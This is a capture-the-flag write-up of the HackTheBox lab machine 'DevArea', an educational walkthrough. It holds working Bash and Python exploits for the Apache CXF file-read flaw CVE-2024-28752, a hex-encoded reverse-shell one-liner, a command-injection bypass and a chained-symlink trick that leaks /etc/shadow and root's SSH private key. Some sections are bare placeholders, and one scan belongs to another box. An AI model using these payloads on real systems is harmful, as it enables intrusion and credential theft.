# HTB DevArea Linux, Medium, 3.4
- by **`0xPablo`  github page `github.com/vorkampfer/hackthebox3`**
*(image: intro_image_devarea_htb_canva_updated.png)*
-  **Resources:**
> 1. 0xdf  - HackTheBox gitlab: `https://0xdf.gitlab.io/2026/07/04/htb-devarea.html`
> 2. IPPSEC -  `https://ippsec.rocks/`

- **View terminal output with color**
> **`ᐅ bat -l Bash --paging=never name_of_file -p`**

### NOTE: This write-up was done using *BlackArch*
*(image: blackarch_forever_4ever_updated 3.jpeg)*
### Synopsis:
```Bash
`DevArea` is a medium-difficulty Linux machine that chains together several service misconfigurations. Anonymous FTP exposes a Java SOAP application built on `Apache CXF` with the Aegis databinding module, which is vulnerable to an SSRF flaw, CVE-2024-28752. We abuse this to read `/proc/<PID>/cmdline` entries and recover the `Hoverfly` admin credentials from the arguments of a running process. The `Hoverfly` Admin UI is affected by CVE-2025-54123, whose middleware endpoint permits remote code execution and grants a foothold as `dev_ryan`. We then analyze the source of an internal monitoring app, `SysWatch`, whose installation script leaves its environment file world-readable. The leaked secret key lets us forge an admin `Flask` session, and a weak blacklist regex in the service-status feature is bypassed to gain command injection as the `syswatch` user. Finally, we abuse a root-executed log-reading CLI whose symlink validation fails to resolve chained symlinks, leaking the root SSH private key for a full compromise.
```
### TLDR:
```Bash
1. I learned a-lot about symlinks. Very fun box except when it crashed on me trying to get the syswatch shell.
```
# Checking connection status
1. **Checking my openvpn connection with a bash script.**
```Bash
1. ᐅ htb.sh --set '10.129.244.208' devarea.htb
[sudo] password for scottx0beam:
==> [+]  Hostname successfully injected!
10.129.244.208 devarea.htb
Done!
2.ᐅ htb.sh --status

==> [+] OpenVPN is up and running.  Initialization Sequence Completed
==> [+] OpenVPN tunnel with logging has started successfully
==> [!] Network is unreachable. Check your connection. It could be just a false positive or generic error on initial connection.
2026-07-06 17:27:58 sitnl_send: rtnl: generic error (-101): Network is unreachable

==>[+]
==>[+]  ps -auxw shows the script is running:
scottx0+  280622  0.0  0.0   8060  5924 pts/13   S+   17:27   0:00 bash /home/scottx0beam/bash_scripts/htb.sh --start-logging DevAreagetoffmynutzsackbeesh.ovpn openvpn.log
scottx0+  280899  0.0  0.0   5776  3884 pts/13   S+   17:27   0:00 tee -a openvpn.log
2026-07-06 17:27:58 OPTIONS IMPORT: tun-mtu set to 1500
2026-07-06 17:27:57 WARNING: Compression for receiving enabled. Compression has been used in the past to break encryption. Compression support is deprecated and we recommend to disable it completely.
2026-07-06 17:27:58 Data Channel: cipher 'AES-256-CBC', auth 'SHA256', peer-id: 55, compression: 'lzo'

==>[+]  The PID number for OpenVPN is: 281020

==>[+]  Your Tun0 ip is: 10.10.14.138

==>[+]  The HackTheBox server IP is: 10.129.244.208 devarea.htb

==> [+]  Successfully pinged the HackTheBox server at 10.129.244.208.
==> [+]  The HackTheBox server is up and responding to ping.
==>[+] 10.129.244.208 (ttl -> 63): Linux

eno1:=> mtu:1300
tun0:=> mtu:1280
==> [+]  Goodbye!
```
# Basic Recon
2. **Nmap**
```Bash
1. I use variables and aliases to make things go faster. For a list of my variables and aliases vist github.com/vorkampfer
2. ᐅ nmap_reader.sh 10.129.244.208
  Target IP provided: 10.129.244.208
Enter the file-path of your nmap scan output file: portzscan.nmap
  File found!
  File format recognized!

>>>  nmap -A -Pn -n -vvv -oN nmap/portzscan.nmap -p 21,22,80,8080,8888
devarea.htb

>>> looking for nginx
>>> looking for OpenSSH
  OpenSSH version: OpenSSH 9.6p1 Ubuntu 3ubuntu13.15
>>> Looking for Apache
Apache httpd 2.4.58
>>> Looking for IIS

>>> Looking for http ports
  80
  8080
  8888
  NOTE: If the specific port is open, it means the TCP port accepted a connection (so it is open at network level). Nmap sent probe data and got an HTTP-like response (so it classified the service as HTTP).

>>> Looking for popular CMS, OpenSource Frameworks, and Web Servers
8080/tcp open  http    syn-ack Jetty 9.4.27.v20200227
|_http-server-header: Jetty(9.4.27.v20200227)
|_http-title: Hoverfly Dashboard
  Hoverfly detected. Hoverfly Dashboard is a web-based interface that allows users to manage and visualize API simulations created with Hoverfly. It provides features for monitoring requests, viewing simulation data, and configuring settings for testing environments..
8888/tcp open  http    syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
  Golang net/http server detected. Golang net/http server is a web server built in the Go programming language.

>>> Looking for any subdomains that may have come out in the nmap scan
  10.129.27.214 devarea.htb

>>> Here are some interesting ports
21/tcp   open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh
  No OpenSSH detected on a non-standard port.

  No PHP version found in the nmap scan output.
  No Microsoft SQL Server detected in the nmap scan output.
8080/tcp open  http      Jetty 9.4.27.v20200227
  This is an http site

Open Ports: 21,22,80,8080,8888

{
  "target": "10.129.27.214",
  "ttl": 63,
  "os_guess": "Linux/Unix-like (likely)"
}

  No clock skew detected. No Kerberos port open.

  No Git repository found in the nmap scan output.

  No robots.txt page found in the nmap scan output.
  Goodbye!
1. Jetty CMS, as well as Hoverfly Dashboard, detected. Also FTP has anonymouse login allowed.
```
# Server is a Ubuntu 24.04.4 (**Noble** **Numbat**)
3. **Discovery with *Ubuntu Launchpad***
```Bash
1. Search "launchpad OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 blueprints"
2. https://blueprints.launchpad.net/ubuntu/+source/openssh/1:9.6p1-3ubuntu13.9
```
4. **Whatweb**
- Nothing
```Bash
1. ᐅ whatweb http://10.129.244.202/
http://10.129.244.202/ [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[nginx/1.22.1], IP[10.129.244.202], RedirectLocation[http://variatype.htb/], Title[301 Moved Permanently], nginx[1.22.1]
http://variatype.htb/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.22.1], IP[10.129.244.202], Title[VariaType Labs — Variable Font Generator], nginx[1.22.1]
2.Nothing. I already added `variatype.htb` to my `/etc/hosts` file. Moving on.
```
5. **curl the server**

```Bash
1. ᐅ curl -s -X GET http://10.129.244.202/ -I
HTTP/1.1 301 Moved Permanently
Server: nginx/1.22.1
Date: Sat, 04 Jul 2026 13:50:49 GMT
Content-Type: text/html
Content-Length: 169
Connection: keep-alive
Location: http://variatype.htb/
2. Curling the Golang Server
>>> ᐅ curl -s -X GET http://10.129.27.214:8888 -I
HTTP/1.1 200 OK
Accept-Ranges: bytes
Content-Length: 600
Content-Type: text/html; charset=utf-8
Last-Modified: Thu, 13 Mar 2025 22:45:45 GMT
Date: Thu, 09 Jul 2026 17:34:50 GMT
```

----
# FTP anonymous is allowed
```Bash
1. ᐅ ftp 10.129.27.214
Connected to 10.129.27.214.
220 (vsFTPd 3.0.5)
Name (10.129.27.214:scottx0beam): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Sep 22  2025 pub
226 Directory send OK.
ftp> cd pug
550 Failed to change directory.
ftp> cd pub
250 Directory successfully changed.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp       6445030 Sep 22  2025 employee-service.jar
226 Directory send OK.
ftp> get employee-service.jar
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for employee-service.jar (6445030 bytes).
226 Transfer complete.
6445030 bytes received in 2.8891 seconds (2.1275 Mbytes/s)
ftp> exit
?Invalid command
ftp> quit
221 Goodbye.
2. ᐅ ls * | grep .jar
.rw-r--r--  6.4M scottx0beam scottx0beam  9 Jul 17:17  employee-service.jar <<< We will come back to this file later.
```

# 8888 is the only valid site
*(image: hoverfly_on_8888.png)*
```Bash
1. I will come back to enumerate the websites after enumerating the `employee-service.jar` file
```

# Jadx
```Bash
1. We will open `employee-service.jar` using jadx
2. sudo pacman -S jadx
3. ᐅ which jadx
/bin/jadx
4. ᐅ mkdir src
5. ᐅ /bin/jadx employee-service.jar -d src/
INFO  - loading ...
INFO  - processing ...
ERROR - finished with errors, count: 10
```

# Enumerating all the files
```Bash
1. There is a ton of files but not passwords in .java files
2. ᐅ cat -A ServerStarter.class | grep 'http://localhost:8080/employeeservice?wsdl'
http://localhost:8080/employeeservice?wsdl
3. http://devarea.htb:8080/employeeservice?wsdl <<< Finding this link tells you how to follow the SOAP protocol to use the application. Basically it is the method used to exfiltrate data. If we send SOAP the correct XML formatted querries we should be able get back file disclosures.
```

# Soapui
```Bash
1. What is "Soapui"
2. SoapUI is the worlds most widely-used automated testing tool for SOAP and REST APIs. Write, run, integrate, and automate advanced API Tests with ease. There is a commercial version `readyAPI`, but the free SoapUI version is enough for what we need.
3. It downloads via a bash script so I will not be installing that on my machine.
4.
```

# Creating the payload, Bash version CVE-2024-28752
1. I would attempt to explain this but when it comes to SOAP/XML protocol I am so confused on it.
2. I recommend checking out either IPPSEC timestamp 21:00 to 23:00 to figure out how this PoC works. 0xdf also explains this very well.
3. Take the bash exploit and run it with the path that you want to read.
4. If you decide to build a payload. Here is the github PoC `https://github.com/vulhub/vulhub/blob/master/apache-cxf/CVE-2024-28752/README.md`
```Bash
#!/bin/bash

fn="${1:-/etc/hostname}"

resp=$(curl -s http://devarea.htb:8080/employeeservice -H 'Content-Type: multipart/related; type="application/xop+xml"; boundary="MIME_boundary"' --data-binary '--MIME_boundary
Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"
Content-Transfer-Encoding: 8bit
Content-ID: <root.message@cxf.apache.org>

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:dev="http://devarea.htb/">
    <soapenv:Body>
        <dev:submitReport>
            <arg0>
                <confidential>false</confidential>
                <content>test content</content>
                <department>IT</department>
                <employeeName><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file://'"$fn"'"/></employeeName>
            </arg0>
        </dev:submitReport>
    </soapenv:Body>
</soapenv:Envelope>
--MIME_boundary')

echo "$resp" | xmllint --xpath "//*[local-name()='return']/text()" - | cut -d' ' -f4 | tr -d '.' | base64 -d
```

# Executing the payload
```Bash
1. ᐅ ./file_read.sh '/etc/passwd'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<SNIP>
2. ᐅ cat passwd | grep -i "sh$"
root:x:0:0:root:/root:/bin/bash
dev_ryan:x:1001:1001::/home/dev_ryan:/bin/bash
3. ᐅ ./file_read.sh /home/dev_ryan/.profile
# ~/.profile: executed by the command interpreter for login shells.
# This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login
# exists.
# see /usr/share/doc/bash/examples/startup-files for examples.
# the files are located in the bash-doc package.<SNIP>
4.ᐅ ./file_read.sh /etc/os-release
PRETTY_NAME="Ubuntu 24.04.4 LTS"
NAME="Ubuntu"
VERSION_ID="24.04"
VERSION="24.04.4 LTS (Noble Numbat)"
5.ᐅ ./file_read.sh '/etc/apache2/sites-available/000-default.conf'
```

# python version of CVE-2024-28752
1.  Requires `$ pip install lxml`
2. I was able to code this version after attempting to understand the exploit.
3. Recommended reading: `https://github.com/vulhub/vulhub/blob/master/apache-cxf/CVE-2024-28752/README.md`
4. `https://www.sentinelone.com/vulnerability-database/cve-2024-28752/`
```python
import sys
import requests
import base64
import lxml.html
from lxml import etree
import re
import binascii

def _normalize_b64(data):
    cleaned = data.replace(".", "").strip()
    cleaned = re.sub(r"\s+", "", cleaned)
    cleaned = re.sub(r"[^A-Za-z0-9+/=_-]", "", cleaned)
    cleaned = cleaned.replace("-", "+").replace("_", "/")

    # Ensure proper Base64 block size.
    missing_padding = (-len(cleaned)) % 4
    if missing_padding:
        cleaned += "=" * missing_padding

    return cleaned

def exploit_devarea(target_url, file_path):
    boundary = "MIME_boundary"

    # The exact payload structure required by the Devarea service
    payload = f"""--{boundary}
Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"
Content-Transfer-Encoding: 8bit
Content-ID: <root.message@cxf.apache.org>

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:dev="http://devarea.htb/">
    <soapenv:Body>
        <dev:submitReport>
            <arg0>
                <confidential>false</confidential>
                <content>test content</content>
                <department>IT</department>
                <employeeName><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file://{file_path}"/></employeeName>
            </arg0>
        </dev:submitReport>
    </soapenv:Body>
</soapenv:Envelope>
--{boundary}--"""

    headers = {
        "Content-Type": f'multipart/related; type="application/xop+xml"; boundary="{boundary}"'
    }

    try:
        response = requests.post(target_url, data=payload, headers=headers, timeout=10)
        response.raise_for_status()

        # Use lxml to extract the content from the <return> tag, mirroring the xmllint logic
        tree = lxml.html.fromstring(response.content)
        result = tree.xpath("//*[local-name()='return']/text()")

        if result:
            raw_data = str(result[0])

            # Mirror the shell exploit first: 4th token, then fallback to best candidate.
            parts = raw_data.split()
            candidate = parts[3] if len(parts) >= 4 else parts[-1]

            try:
                print(base64.b64decode(_normalize_b64(candidate)).decode('utf-8', errors='replace'))
            except (binascii.Error, UnicodeDecodeError, ValueError, IndexError):
                # Some responses contain multiple tokens; decode the longest b64-like chunk.
                tokens = re.findall(r"[A-Za-z0-9+/._=-]+", raw_data)
                best = max(tokens, key=len) if tokens else ""
                print(base64.b64decode(_normalize_b64(best)).decode('utf-8', errors='replace'))
        else:
            print("[-] No return data found. Check if the file exists or path is accessible.")

    except (requests.RequestException, ValueError, binascii.Error, etree.ParserError) as e:
        print(f"[-] Exploit failed: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 exploit.py <file_path>")
        sys.exit(1)

    TARGET = "http://devarea.htb:8080/employeeservice"
    exploit_devarea(TARGET, sys.argv[1])
```

# Executing python version
1. I named it `soap_communicator.py`
```Bash
1. ~/hax4crack/devarea/CVE-2024-28752 ᐅ python3.12 soap_communicator.py '/etc/os-release'
PRETTY_NAME="Ubuntu 24.04.4 LTS"
NAME="Ubuntu"
VERSION_ID="24.04"
VERSION="24.04.4 LTS (Noble Numbat)"
VERSION_CODENAME=noble
ID=ubuntu
ID_LIKE=debian
2. CVE-2024-28752 ᐅ python3.12 soap_communicator.py '/proc/self/cmdline'
/usr/lib/jvm/java-8-openjdk-amd64/bin/java-jar/opt/EmployeeService/target/employee-service.jar
3.CVE-2024-28752 ᐅ python3.12 soap_communicator.py /
bin
bin.usr-is-merged
boot
cdrom
dev
etc
home
lib
lib.usr-is-merged
lib64
lost+found
media
mnt
nix
opt
proc
root
run
sbin
sbin.usr-is-merged
snap
srv
sys
tmp
usr
var
4.CVE-2024-28752 ᐅ python3.12 soap_communicator.py '/etc/systemd/system/hoverfly.service'
[Unit]
Description=HoverFly service
After=network.target

[Service]
User=dev_ryan
Group=dev_ryan
WorkingDirectory=/opt/HoverFly
ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU -listen-on-host 0.0.0.0

Restart=on-failure
RestartSec=5
StartLimitIntervalSec=60
StartLimitBurst=5
LimitNOFILE=65536
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
```

# `/proc/self/cmdline` bash script
1. I tried just doing a 1 liner for loop in the terminal and it failed for some reason.
>`ᐅ PIDS=$(python3.12 ~/CVE-2024-28752/soap_communicator.py /proc/ | grep '^[0-9]')`
>`ᐅ for i in $PIDS; do python3.12 soap_communicator.py '/proc/$i/cmdline' 2>/dev/null; done
2. I call this soap_communicator.sh script. Call it whatever. You need to change the path and name of the above soap_communicator.py script in this bash version.
3. This script will run through `/proc/?/cmdline` and it finds a credential.
MD2GH16

# Executing the script
1. Great scripting practice but it turns out the credential is the same one we had before for the hoverfly admin.
MD2GH17

# Logging into the admin dashboard
1. Image 1 - Login as admin
![[hoverfly_on_8888_login_as_admin_dashboard.png]]
MD2GH18

# Version leakage `v1.11.3`
![[hoverfly_cvedetails_CVE.png]]
1. The first thing upon logging in is the display of the version number.
2. The version number should be stored properly on an encrypted server. LOL, Hacker nerd humor.
MD2GH19
# CVE-2025-54123 Background
1. The vulnerability exists in the middleware management API endpoint `/api/v2/hoverfly/middleware`. This issue is born due to combination of three code level flaws: Insufficient Input Validation in middleware.go line 94-96; Unsafe Command Execution in local_middleware.go line 14-19; and Immediate Execution During Testing in hoverfly_service.go line 173. This allows an attacker to gain remote code execution (RCE) on any system running the vulnerable Hoverfly service. Since the input is directly passed to system commands without proper checks, an attacker can upload a malicious payload or directly execute arbitrary commands (including reverse shells) on the host server with the privileges of the Hoverfly process.
MD2GH20
# CVE-2025-54123 PoC
1. `https://github.com/SpectoLabs/hoverfly/security/advisories/GHSA-r4h8-hfp2-ggmf`
2. Image 1 - Screenshot of where the authorization header is on the admin dashboard
![[middleware_headers_DOM_admin_dashboard_htb_devarea.png]]
MD2GH21
# Burpsuite
![[burpsuite_dev_ryan_id_whoami_RCE_htb_devarea.png]]
MD2GH22

# Weaponizing the payload
![[burpsuite_shell_dev_ryan.png]]
MD2GH23

# Shell as dev_ryan & upgrade
MD2GH24

# Begin enumeration as dev_ryan
MD2GH25

# syswatch
MD2GH26

# Since dev_ryan has ssh access I will get an ssh shell with him because we may need it
1. Make sure to delete or comment out the entry in your `/etc/ssh/ssh_config` file if you do not need it. Just for good OPSEC.
- #pwn_ssh_command_line_shell_kb
1. 35:58
MD2GH27

# Syswatch forwarded
![[syswatch_port_forward.png]]
MD2GH28

# Flask-unsign
![[pasting_flask_jwt_cookie_syswatch_dashboard.png]]
1. With the syswatch secret key we are able to create a flask JWT.
MD2GH29

# syswatch admin dashboard `Check System Service Status`
MD2GH30

# Remote Code Execution found
1. Image 1 - Finding the first vulnerable syntax for a command injection
![[burpsuite_sleep3.png]]
2. All we needed to do was place a pip after the ssh command. `service=ssh|sleep 3`
3. Image 3 - Here we encoded our payload in hex and then decode to avoid all the special character bans.

MD2GH31

# Shell as syswatch
![[burpsuite_syswatch_hex_encoded_payload_htb_devarea_07_10_2026.png]]
1. The original hex encoded payload does work. I had to retry it a few times and then I think I made the server crash. So I had to redo the box all over again.
2. IPPSEC used `service=a|echo -n ....`. Which also works. He replaced the valid command `ssh` with the letter `a` and that allowed him to get a shell, but If you try it the first time and only send it once you should be able to get a shell. `servic=shell|echo -n ...` can crash the server if you keep sending the command before it has time to reset. The reason behind it IPPSEC explains in timestamp 48:40.
3. Original encoded payload = `ᐅ echo 'bash -i >& /dev/tcp/10.10.15.63/443 0>&1' | xxd -p -c0`
MD2GH32

# Begin enumeration as syswatch
MD2GH33

# Playing with symlinks
MD2GH34

# Bypass blocked unsafe symlinks pointing to sensitive files
1. `pwn.log` is pointing to `/etc/shadow` and our `foo.log` which we own is pointing to `pwn.log`. This symlink vuln is so dumb but common. I think symlinks are a good thing to get good at because they can offer security by obfuscation and for the hacker as well. FYI, symlinking can be completely disabled on a Linux system, but it could cost critical functionality of a system that is why no one ever disables symlinks.
```Bash
1. syswatch@devarea:~/logs$ ln -s /etc/shadow pwn.log
2. syswatch@devarea:~/logs$ ln -s pwn.log foo.log
3. syswatch@devarea:~/logs$ rm pwn.log
4. dev_ryan@devarea:~/.ssh$ sudo /opt/syswatch/syswatch.sh logs foo.log
root:$y$j9T$0KQ.TnjYkG3YsYKhdzY2I.$lGbupe1hBuVMuNFnjOfL4Oo7kFUTHPv2ocodVgqmdr9:20353:0:99999:7:::
daemon:*:20305:0:99999:7:::
bin:*:20305:0:99999:7:::<SNIP>
5. We can do the same exact thing and get the root flag
6. syswatch@devarea:~/logs$ ln -s /root/root.txt pwn.log
8.dev_ryan@devarea:~/.ssh$ sudo /opt/syswatch/syswatch.sh logs foo.log
454773b7882040ab91744<SNIP>
```

*(image: PWN_HTB_DEVAREA_07_10_2026.png)*
# PWNED

# Beyond pwn
1. I was able to get root, but I still need to learn a-lot about symlinks. I am no where near the levels of some of these 1337 h@x0rs. If somethings went over your head you are not alone. The key is to keep on learning and growing.
```Bash
1. syswatch@devarea:~/logs$ ln -sf redirect flag.log; ln -sf /root/.ssh/authorized_keys redirect
2. syswatch@devarea:~/logs$ ls -l redirect flag.log
lrwxrwxrwx 1 syswatch syswatch  8 Jul 11 12:04 flag.log -> redirect
lrwxrwxrwx 1 syswatch syswatch 26 Jul 11 12:04 redirect -> /root/.ssh/authorized_keys
3. dev_ryan@devarea:~/.ssh$ sudo /opt/syswatch/syswatch.sh logs flag.log
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIALkh4a8v0TnM9hl7suGkcxxVGxKxR/1NuFu3t8mowp/ root@devarea
4. syswatch@devarea:~/logs$ ln -sf redirect flag.log; ln -sf /root/.ssh/id_ed25519 redirect
5. dev_ryan@devarea:~/.ssh$ sudo /opt/syswatch/syswatch.sh logs flag.log
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAAC.........<SNIP>........................qMKfwAAAJCpWMQqqVjE
KgAAAAtzc2gt.......................................sSsUf9Tbhbt7fJqMKfw
AAAEAgx+KGKmchYnjPrbBgHwaX9SV9+qcdc5p+kHrSVpwMMALkh4a8v0TnM9hl7suGkcxx
VGxKxR/1NuFu3t8mowp/AAAADHJvb3RAZGV2YXJlYQE=
-----END OPENSSH PRIVATE KEY-----
6. ᐅ vim id_rsa
7. ᐅ chmod 600 id_rsa
8. ᐅ ssh root@devarea.htb -i id_rsa
9. root@devarea:~# whoami
root
10. root@devarea:~# cat /etc/shadow
root:$y$j9T$0KQ.TnjYkG3YsYKhdzY2I.$lGbupe1hBuVMuNFnjOfL4Oo7kFUTHPv2ocodVgqmdr9:20353:0:99999:7:::
daemon:*:20305:0:99999:7:::
bin:*:20305:0:99999:7:::<SNIP>
```
